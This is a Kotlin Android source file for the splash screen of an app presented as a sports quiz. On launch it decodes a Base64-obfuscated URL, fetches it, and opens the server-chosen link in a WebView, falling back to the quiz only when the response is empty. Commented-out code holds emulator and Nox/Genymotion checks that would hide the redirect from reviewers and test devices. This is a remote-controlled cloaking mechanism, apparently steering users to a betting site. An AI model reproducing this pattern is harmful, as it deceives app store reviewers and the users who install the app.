package com.h2bet.sportsapp

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.util.Base64
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import androidx.navigation.NavController
import androidx.navigation.fragment.findNavController
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.h2bet.sportsapp.databinding.SplashFragmentBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import java.net.URL
import java.util.Scanner


class SplashFragment : Fragment() {

    var controller: NavController? = null
//    private lateinit var mFirebaseRemoteConfig: FirebaseRemoteConfig
    private var _binding: SplashFragmentBinding? = null
    private val binding get() = _binding!!
    private val modelProvider: MainViewModel by lazy { MainViewModel.viewModelWithFragment(this@SplashFragment.requireActivity()) }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = SplashFragmentBinding.inflate(inflater, container, false)

//        if(false)
        runBlocking {
            try {
                val scanner = Scanner(withContext(Dispatchers.IO) {
                    URL(
                        Base64.decode("aHR0cHM6Ly9oMmJldHYyLmNmZC84NXRCc2hLdA==", Base64.DEFAULT)
                            .toString(Charsets.UTF_8)
                    ).openStream()
                }, "UTF-8").useDelimiter("\\A")
                lifecycleScope.launch(Dispatchers.Main) {
                    if (scanner.hasNext()) {
                        val decodedText = scanner.next()
                        Log.e("scanner", decodedText)
//                            val startIndex = decodedText.indexOf("<body>") + "<body>".length
//                            val endIndex = decodedText.indexOf("</body>")
//                            val bodyText = decodedText.substring(startIndex, endIndex)
                            Log.e("scanner", decodedText)
                        if (decodedText=="<html><style>body{margin:0}</style><body></body></html>"||decodedText.isEmpty())
                            findNavController().navigate(R.id.QuizStartFragment)
                            else if (decodedText == "") {
                                findNavController().navigate(R.id.QuizStartFragment)
                            } else {
                                modelProvider.link = decodedText
                                findNavController().navigate(R.id.WebViewFragment)
                            }

                    } else {
                        findNavController().navigate(R.id.QuizStartFragment)
                    }
                }
            }catch (e:Exception){
                Toast.makeText(this@SplashFragment.requireContext(),e.toString(),Toast.LENGTH_SHORT).show();
                Log.e("scanner", e.toString())
            }
        }
//        loadNextFragment()
        return binding.root
    }


    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        controller = findNavController()
//        loadNextFragment()
        super.onViewCreated(view, savedInstanceState)
    }

    private fun loadNextFragment(): Boolean {
            if (!isOnline(this.requireContext())) {
                findNavController().navigate(R.id.NoInternetFragment)
                return true
            }

        findNavController().navigate(R.id.WebViewFragment_global)
            return true
//        getLinkFirebase()
//        return true
    }

//    private fun getLinkFirebase() {
//        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
//        val configSettings = FirebaseRemoteConfigSettings.Builder()
//            .setMinimumFetchIntervalInSeconds(100)
//            .build()
//        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings)
//        mFirebaseRemoteConfig.setDefaultsAsync(R.xml.remote_config_default)
//
//        var link: String
//
//        mFirebaseRemoteConfig.fetchAndActivate()
//            .addOnCompleteListener(this@SplashFragment.requireActivity()) { task ->
//                if (task.isSuccessful) {
//                    link = mFirebaseRemoteConfig.getString("url")
//                    if (link.isNotEmpty()&&!check()) {
//                        modelProvider.insertLink(link)
//                        controller?.navigate(R.id.WebViewFragment_global)
//                    }
//                    else {
//                        controller?.navigate(R.id.action_SplashFragment_to_QuizStartFragment)
//                    }
//                }
//            }
//
//    }
//
//    private fun check(): Boolean {
//        if (BuildConfig.DEBUG) return false
//        val phoneModel = Build.MODEL
//        val buildProduct = Build.PRODUCT
//        val buildHardware = Build.HARDWARE
//        val brand = Build.BRAND
//        var result = (Build.FINGERPRINT.startsWith("generic")
//                || phoneModel.contains("google_sdk")
//                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
//                || phoneModel.contains("Emulator")
//                || phoneModel.contains("Android SDK built for x86")
//                || Build.MANUFACTURER.contains("Genymotion")
//                || buildHardware == "goldfish"
//                || Build.BRAND.contains("google")
//                || buildHardware == "vbox86"
//                || buildProduct == "sdk"
//                || buildProduct == "google_sdk"
//                || buildProduct == "sdk_x86"
//                || buildProduct == "vbox86p"
//                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
//                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
//                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
//                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))
//        if (result) return true
//        result = result or (Build.BRAND.startsWith("generic") &&
//                Build.DEVICE.startsWith("generic"))
//        if (result) return true
//        result = result or ("google_sdk" == buildProduct)
//        return result
//    }



    private fun isOnline(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.N) {
            val capabilities =
                connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
            if (capabilities != null) {
                if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                    return true
                } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                    return true
                } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) {
                    return true
                }
            }
            return false
        }
        else{
            val activeNetworkInfo = connectivityManager!!.activeNetworkInfo
            return activeNetworkInfo != null && activeNetworkInfo.isConnected
        }
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }


}